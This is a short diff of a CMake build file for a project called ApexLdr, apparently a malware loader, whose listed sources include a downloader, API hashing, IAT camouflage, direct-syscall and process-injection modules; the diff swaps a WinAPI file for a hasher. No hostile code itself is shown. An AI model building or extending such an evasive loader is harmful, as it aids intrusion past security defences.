@@ -12,7 +12,6 @@ set(APEXLDR_SRC
         include/common.h
         src/downloader.c
         src/iatcamo.c
-        src/winapi.c
         include/structs.h
         src/apihashing.c
         src/apihammer.c
@@ -25,6 +24,8 @@ set(APEXLDR_SRC
         include/syswhispers.h
         src/inject.c
         include/inject.h
+        src/hasher.c
+        include/hasher.h
 )
 
 add_executable(ApexLdr ${APEXLDR_SRC})
